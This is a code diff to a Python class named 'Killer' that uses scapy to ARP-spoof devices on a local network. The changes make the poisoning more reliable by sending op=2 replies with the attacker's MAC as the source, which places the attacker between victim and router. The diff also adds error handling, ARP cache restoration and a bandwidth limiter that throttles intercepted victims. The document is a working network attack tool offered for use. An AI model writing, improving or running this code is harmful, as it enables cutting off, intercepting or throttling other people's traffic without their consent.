@@ -1,8 +1,12 @@
-from scapy.all import ARP, send
+from scapy.all import ARP, send, Ether, sendp
 from time import sleep
+import logging
 
 from tools.utils import threaded, get_default_iface
 from constants import *
+from networking.limiter import SimpleBandwidthLimiter
+
+logger = logging.getLogger(__name__)
 
 class Killer:
     def __init__(self, router=DUMMY_ROUTER):
@@ -10,64 +14,87 @@ class Killer:
         self.router = router
         self.killed = {}
         self.storage = {}
+        self.my_mac = None  # Store our MAC to avoid self-pollution
+        self.bandwidth_limiter = SimpleBandwidthLimiter()  # Bandwidth limiting support
+    
+    def set_my_mac(self, mac):
+        """Set attacker's MAC address to prevent self-targeting"""
+        self.my_mac = mac
+        logger.info(f'Attacker MAC set to: {mac}')
     
     @threaded
     def kill(self, victim, wait_after=1):
         """
-        Spoofing victim
+        Spoofing victim with proper MAC isolation
         """
         if victim.mac in self.killed:
-            print(victim.mac, 'is already killed.')
+            logger.warning(f'{victim.mac} is already killed.')
+            return
+        
+        # Prevent killing our own machine
+        if self.my_mac and victim.mac == self.my_mac:
+            logger.error('Cannot kill own device!')
             return
         
         self.killed[victim.mac] = victim
 
-        # Cheat Victim
+        # Create proper ARP packets with explicit source MAC
+        # Tell victim that router is at our MAC (MITM position)
         to_victim = ARP(
-            op=1,
+            op=2,  # ARP reply (op=2 is more reliable than op=1)
             psrc=self.router.ip,
-            hwdst=victim.mac,
-            pdst=victim.ip
+            hwsrc=self.my_mac or self.iface.mac,  # Use our MAC explicitly
+            pdst=victim.ip,
+            hwdst=victim.mac
         )
 
-        # Cheat Router
+        # Tell router that victim is at our MAC (MITM position)
         to_router = ARP(
-            op=1,
+            op=2,  # ARP reply
             psrc=victim.ip,
-            hwdst=self.router.mac,
-            pdst=self.router.ip
+            hwsrc=self.my_mac or self.iface.mac,  # Use our MAC explicitly
+            pdst=self.router.ip,
+            hwdst=self.router.mac
         )
 
-        print('killed', victim.mac)
+        logger.info(f'Killing {victim.ip} ({victim.mac})')
 
         while victim.mac in self.killed \
             and self.iface.name != 'NULL':
-            # Send packets to both victim and router
-            send(to_victim, iface=self.iface.name ,verbose=0)
-            send(to_router, iface=self.iface.name ,verbose=0)
+            # Send packets to both victim and router with explicit targeting
+            try:
+                send(to_victim, iface=self.iface.name, verbose=0, count=1)
+                send(to_router, iface=self.iface.name, verbose=0, count=1)
+            except Exception as e:
+                logger.error(f'Error sending ARP packets: {e}')
+                break
             sleep(wait_after)
 
-        print('unkilled', victim.mac)
+        logger.info(f'Unkilled {victim.ip} ({victim.mac})')
 
     @threaded
     def unkill(self, victim):
         """
-        Unspoofing victim
+        Restore proper ARP entries for victim
         """
+        if victim.mac not in self.killed:
+            logger.warning(f'{victim.mac} is not in killed list')
+            return
+            
         self.killed.pop(victim.mac)
 
-        # Fix Victim
+        # Restore Victim's ARP cache with correct router MAC
         to_victim = ARP(
-            op=1,
+            op=2,  # ARP reply
             psrc=self.router.ip,
             hwsrc=self.router.mac,
             pdst=victim.ip,
             hwdst=victim.mac
         )
 
-        # Fix Router
+        # Restore Router's ARP cache with correct victim MAC
         to_router = ARP(
-            op=1,
+            op=2,  # ARP reply
             psrc=victim.ip,
             hwsrc=victim.mac,
             pdst=self.router.ip,
@@ -75,9 +102,13 @@ class Killer:
         )
 
         if self.iface.name != 'NULL':
-            # Send packets to both victim and router
-            send(to_victim, iface=self.iface.name ,verbose=0)
-            send(to_router, iface=self.iface.name ,verbose=0)
+            try:
+                # Send restoration packets multiple times for reliability
+                send(to_victim, iface=self.iface.name, verbose=0, count=5)
+                send(to_router, iface=self.iface.name, verbose=0, count=5)
+                logger.info(f'Successfully restored ARP for {victim.ip}')
+            except Exception as e:
+                logger.error(f'Error restoring ARP: {e}')
 
     def kill_all(self, device_list):
         """
@@ -124,3 +155,33 @@ class Killer:
                 new_devices.append(old)
 
             self.kill(old)
+    
+    def limit_bandwidth(self, victim, download_kbps=None, upload_kbps=None):
+        """
+        Apply bandwidth limits to a device (must be killed first for MITM)
+        
+        Args:
+            victim: Device object
+            download_kbps: Download speed limit in KB/s (None = unlimited)
+            upload_kbps: Upload speed limit in KB/s (None = unlimited)
+        """
+        if victim.mac not in self.killed:
+            logger.warning(f'Device {victim.mac} must be killed before applying bandwidth limits')
+            return False
+        
+        self.bandwidth_limiter.set_limit(victim.mac, download_kbps, upload_kbps)
+        logger.info(f'Bandwidth limits applied to {victim.ip}: DL={download_kbps}KB/s, UL={upload_kbps}KB/s')
+        return True
+    
+    def remove_bandwidth_limit(self, victim):
+        """
+        Remove bandwidth limits from a device
+        """
+        self.bandwidth_limiter.remove_limit(victim.mac)
+        logger.info(f'Bandwidth limits removed from {victim.ip}')
+    
+    def get_bandwidth_limits(self):
+        """
+        Get all current bandwidth limits
+        """
+        return self.bandwidth_limiter.get_limits()
